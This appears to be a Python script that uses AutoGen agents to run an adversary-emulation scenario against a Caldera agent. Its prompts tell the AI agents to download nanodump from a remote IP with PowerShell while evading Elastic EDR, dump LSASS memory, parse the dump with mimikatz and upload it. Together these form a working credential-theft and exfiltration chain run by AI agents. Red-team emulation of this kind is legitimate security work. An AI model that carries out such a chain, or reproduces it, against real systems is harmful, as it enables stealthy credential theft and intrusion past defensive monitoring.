import autogen.runtime_logging
from agents.caldera_agent import caldera_agent_user_proxy, caldera_agent
from agents.groupchat_agent import human_analyst_agent

from utils.shared_config import clean_working_directory, llm_config
import autogen


def run_scenario():
    clean_working_directory("/caldera")

    groupchat = autogen.GroupChat(
        agents=[
            human_analyst_agent,
            caldera_agent_user_proxy,
            caldera_agent,
        ],
        messages=[],
    )
    groupchat_manager = autogen.GroupChatManager(
        groupchat=groupchat, llm_config=llm_config
    )

    chat_result = human_analyst_agent.initiate_chat(
        groupchat_manager,
        message="Get the ID of the active Caldera operation.",
        clear_history=True,
    )

    chat_result = human_analyst_agent.initiate_chat(
        groupchat_manager,
        message="Get the PAW of the active Caldera agent by calling /api/v2/agents.",
        clear_history=False,
    )

    chat_result = human_analyst_agent.initiate_chat(
        groupchat_manager,
        message="Summarize the ID and PAW from previous steps in a table.",
        clear_history=False,
    )

    chat_result = human_analyst_agent.initiate_chat(
        groupchat_manager,
        message="Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent. Do this stealth to bypass Elastic EDR.",
        clear_history=False,
    )

    chat_result = human_analyst_agent.initiate_chat(
        groupchat_manager,
        message="Analyze the available nanodump flags at https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
        clear_history=False,
    )

    chat_result = human_analyst_agent.initiate_chat(
        groupchat_manager,
        message="Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. Write the dump to C:\\temp.",
        clear_history=False,
    )

    chat_result = human_analyst_agent.initiate_chat(
        groupchat_manager,
        message="Use PowerShell to analyze the LSASS file using C:\\temp\\mimikatz.exe.",
        clear_history=False,
    )

    chat_result = human_analyst_agent.initiate_chat(
        groupchat_manager,
        message="Use PowerShell to upload the dumped LSASS file.",
        clear_history=False,
    )
